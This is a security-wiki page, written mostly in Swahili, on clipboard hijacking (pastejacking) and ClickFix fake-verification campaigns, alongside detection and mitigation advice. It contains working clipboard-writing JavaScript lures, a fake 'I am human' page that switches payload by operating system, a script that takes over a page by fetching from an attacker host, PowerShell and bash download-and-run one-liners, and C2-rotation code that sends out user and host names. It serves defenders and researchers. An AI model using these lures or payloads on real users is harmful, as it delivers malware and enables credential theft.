# Clipboard Hijacking (Pastejacking) Shambulizi

{{#include ../../banners/hacktricks-training.md}}

> "Usibandike chochote ambacho hukinakili mwenyewe." – ushauri wa zamani lakini bado ni mzuri

## Muhtasari

Clipboard hijacking – also known as *pastejacking* – inatumia ukweli kwamba watumiaji mara kwa mara wananakili-na-kubandika amri bila kuziangalia. Kurasa ya wavuti yenye madhara (au muktadha wowote unaoweza kuendesha JavaScript kama Electron au Desktop application) kwa programu inaweka maandishi yanayotawaliwa na mshambuliaji kwenye clipboard ya mfumo. Waathirika wanahimizwa, kawaida kwa maagizo ya social-engineering yaliyotengenezwa kwa uangalifu, kubonyeza **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), au kufungua terminal na *bandika* yaliyomo kwenye clipboard, na mara moja kutekeleza amri zozote.

Kwa sababu **hakuna faili inapopakuliwa na hakuna kiambatisho kinachofunguliwa**, mbinu hii inapita udhibiti wa usalama wa barua pepe na yaliyomo kwenye wavuti vinavyofuatilia viambatisho, macros au utekelezaji wa amri moja kwa moja. Shambulio hili kwa hivyo ni maarufu katika kampeni za phishing zinazowasilisha familia za malware kama NetSupport RAT, Latrodectus loader au Lumma Stealer.

## Forced copy buttons and hidden payloads (macOS one-liners)

Baadhi ya macOS infostealers huiga tovuti za installer (mfano, Homebrew) na **kulazimisha matumizi ya kitufe cha “Copy”** ili watumiaji wasiweze kuangazia tu maandishi yanayoonekana. Ingizo kwenye clipboard lina amri ya installer inayotarajiwa pamoja na payload ya Base64 iliyoongezwa mwishoni (mfano, `...; echo <b64> | base64 -d | sh`), hivyo kubandika mara moja kunatekeleza vyote wakati UI inaficha hatua ya ziada.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Kampeni za zamani zilitumia `document.execCommand('copy')`, za hivi karibuni zinategemea asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## Mtiririko wa ClickFix / ClearFake

1. Mtumiaji anatembelea tovuti typosquatted au compromised (kwa mfano `docusign.sa[.]com`)
2. JavaScript iliyochomwa **ClearFake** inaita helper `unsecuredCopyToClipboard()` ambayo kimya kimya inahifadhi PowerShell one-liner iliyosimbwa kwa Base64 katika clipboard.
3. Maelekezo ya HTML humnukuu mwathiriwa: *“Bonyeza **Win + R**, bandika amri na bonyeza Enter ili kutatua tatizo.”*
4. `powershell.exe` inaendesha, ikipakua archive yenye executable halali pamoja na DLL yenye madhara (classic DLL sideloading).
5. Loader ina-decrypt hatua za ziada, huaingiza shellcode na kusanidi persistence (mf., scheduled task) — hatimaye kukimbia NetSupport RAT / Latrodectus / Lumma Stealer.

### Mfano wa mnyororo wa NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) hutafuta katika saraka yake `msvcp140.dll`.
* DLL ya hasidi inatafsiri APIs kwa wakati wa utekelezaji kwa kutumia **GetProcAddress**, inapakua binaries mbili (`data_3.bin`, `data_4.bin`) kupitia **curl.exe**, inazidecrypt kwa kutumia rolling XOR key `"https://google.com/"`, inaingiza shellcode ya mwisho na inafungua (unzips) **client32.exe** (NetSupport RAT) hadi `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Inapakua `la.txt` kwa **curl.exe**
2. Inatekeleza JScript downloader ndani ya **cscript.exe**
3. Inachukua MSI payload → inaweka `libcef.dll` kando ya programu iliyosainiwa → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer kupitia MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Itekelezo la **mshta** linaanzisha skripti ya PowerShell iliyofichwa ambayo inapakua `PartyContinued.exe`, inachomoa `Boat.pst` (CAB), inajenga upya `AutoIt3.exe` kwa kutumia `extrac32` na kuunganisha faili, na hatimaye inaendesha skripti ya `.a3x` ambayo exfiltrates browser credentials kwa `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Kampeni baadhi za ClickFix zinakataa kabisa kupakua faili na kuagiza waathiriwa kubandika one‑liner inayopakua na kuendesha JavaScript kupitia WSH, kuiweka kudumu, na kuzungusha C2 kila siku. Mfano wa mnyororo uliotazamwa:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sifa kuu
- URL iliyofichwa inageuzwa wakati wa runtime ili kupinga ukaguzi wa kawaida.
- JavaScript inajidumu kupitia Startup LNK (WScript/CScript), na huchagua C2 kulingana na siku ya sasa – kuruhusu mzunguko wa domain wa haraka.

Kipande cha chini kabisa cha JS kinachotumika kuzungusha C2s kwa tarehe:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Hatua inayofuata kawaida huzindua loader ambayo inaunda persistence na inavuta RAT (mfano, PureHVNC), mara nyingi ikifunga TLS kwa cheti kilichowekwa ndani ya msimbo na kugawanya trafiki.

Mawazo ya utambuzi maalumu kwa aina hii
- Mti wa michakato: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Viashiria vya startup: LNK katika `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` ikitumia WScript/CScript na njia ya JS chini ya `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU na telemetry ya command‑line yenye `.split('').reverse().join('')` or `eval(a.responseText)`.
- Kurudufu `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks ambazo baadaye zinaendesha LOLBins kama `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` chini ya task/path inayotokea kama updater (mfano, `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Majina ya host ya C2 yanayobadilika kila siku na URL zenye muundo wa `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Unganisha matukio ya kuandika clipboard yakifuatiwa na Win+R paste kisha utekelezaji wa `powershell.exe` mara moja.

Blue-teams wanaweza kuunganisha telemetry ya clipboard, process-creation na registry ili kubaini matumizi mabaya ya pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` inahifadhi historia ya **Win + R** amri – angalia maingizo ya Base64 / yaliyofichwa yasiyo ya kawaida.
* Security Event ID **4688** (Process Creation) ambapo `ParentImage` == `explorer.exe` na `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** kwa uundaji wa faili chini ya `%LocalAppData%\Microsoft\Windows\WinX\` au folda za muda tu kabla ya tukio la 4688 lenye shaka.
* EDR clipboard sensors (ikiwa zipo) – unganisha `Clipboard Write` ikifuatiwa mara moja na mchakato mpya wa PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Kampeni za karibuni zinatengeneza kwa wingi kurasa za uhakiki bandia za CDN/browser ("Just a moment…", IUAM-style) ambazo zinawalazimisha watumiaji kunakili amri maalum za OS kutoka clipboard yao kwenda kwenye consoles za asili. Hii husukuma utekelezaji nje ya browser sandbox na inafanya kazi kwenye Windows na macOS.

Sifa kuu za kurasa zinazozalishwa na builder
- Ugundaji wa OS kupitia `navigator.userAgent` ili kubadilisha payloads (Windows PowerShell/CMD vs. macOS Terminal). Decoys/no-ops za hiari kwa OS zisizoungwa mkono ili kudumisha dhana.
- Nakili kwa clipboard kiotomatiki kwenye vitendo vya UI visivyo hatari (checkbox/Copy) wakati maandishi yanayoonekana yanaweza kutofautiana na yaliyomo kwenye clipboard.
- Kuziba mobile na popover yenye maelekezo hatua kwa hatua: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Obfuscation ya hiari na single-file injector ili kuandika upya DOM ya tovuti iliyodukuliwa na UI ya uhakiki iliyotengenezwa kwa Tailwind (hakuna usajili wa domain mpya unaohitajika).

Mfano: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence ya utekelezaji wa awali
- Tumia `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ili utekelezaji uendelee baada ya terminal kufungwa, kupunguza artifacts zinazoweza kuonekana.

In-place page takeover kwenye compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Kurasa zinazounganisha Clipboard API na verification widgets; kutokubaliana kati ya maandishi yanayoonekana na clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace katika muktadha wa kushukiwa.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` hivi punde baada ya mwingiliano wa browser; batch/MSI installers zinatekelezwa kutoka `%TEMP%`.
- macOS endpoint: Terminal/iTerm zinazozalisha `bash`/`curl`/`base64 -d` na `nohup` karibu na matukio ya browser; background jobs kuendelea hata baada ya kufungwa kwa terminal.
- Linganisha `RunMRU` Win+R history na clipboard writes na uundwaji uliofuata wa mchakato wa console.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake inaendelea kudhuru tovuti za WordPress na kuingiza loader JavaScript inayounganisha external hosts (Cloudflare Workers, GitHub/jsDelivr) na hata blockchain “etherhiding” calls (mfano, POSTs kwa Binance Smart Chain API endpoints kama `bsc-testnet.drpc[.]org`) ili kuvuta logic ya lure ya sasa. Overlays za hivi karibuni zinatumia kwa wingi fake CAPTCHAs zinazowaelekeza watumiaji kunakili/kubandika one-liner (T1204.004) badala ya kupakua kitu chochote.
- Utekelezaji wa awali umeongezeka kupelekwa kwa signed script hosts/LOLBAS. January 2026 chains zilibadilisha matumizi ya awali ya `mshta` kwa built-in `SyncAppvPublishingServer.vbs` inayotekelezwa kupitia `WScript.exe`, ikipitisha PowerShell-like arguments zenye aliases/wildcards ili kupata remote content:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` imewekwa saini na kawaida hutumika na App-V; ikiwa imeunganishwa na `WScript.exe` na hoja zisizo za kawaida (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) inakuwa hatua ya LOLBAS yenye ishara kubwa kwa ClearFake.
- Februari 2026 fake CAPTCHA payloads zilihamia tena kwenye download cradles za PowerShell safi. Mifano miwili hai:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Mlolongo wa kwanza ni grabber ya katika kumbukumbu `iex(irm ...)`; hatua ya pili inafuata kupitia `WinHttp.WinHttpRequest.5.1`, inaandika `.ps1` ya muda, kisha inaanza na `-ep bypass` katika dirisha lililofichwa.

Vidokezo vya utambuzi/uchunguzi kwa aina hizi
- Mfuatano wa mchakato: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` au PowerShell cradles mara moja baada ya uandishi wa clipboard/Win+R.
- Maneno muhimu ya mstari wa amri: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, au raw IP `iex(irm ...)` patterns.
- Mtandao: mawasiliano ya kutoka kwenda CDN worker hosts au blockchain RPC endpoints kutoka kwa script hosts/PowerShell muda mfupi baada ya kuvinjari wavuti.
- Faili/registry: uundaji wa muda wa `.ps1` chini ya `%TEMP%` pamoja na vingozi vya RunMRU vinavyojumuisha one-liners hizi; zuia/ toa onyo kuhusu signed-script LOLBAS (WScript/cscript/mshta) zinapotekelezwa na URLs za nje au nyaya za alias zilizofichwa.

## Mitigasi

1. Kuweka browser salama – zima ufikiaji wa kuandika clipboard (`dom.events.asyncClipboard.clipboardItem` etc.) au liwe sharti la tendo la mtumiaji.
2. Uelewa wa usalama – fundisha watumiaji wa *andika* amri nyeti au kuzibandika kwanza kwenye mhariri wa maandishi.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ili kuziba one-liners zisizofaa.
4. Udhibiti wa mtandao – zuia maombi ya kutoka kwenda domains zinazojulikana za pastejacking na C2 za malware.

## Mbinu zinazohusiana

* **Discord Invite Hijacking** mara nyingi hutumia njia ile ile ya ClickFix baada ya kuwavutia watumiaji kwenye seva ya hatari:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Marejeo

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
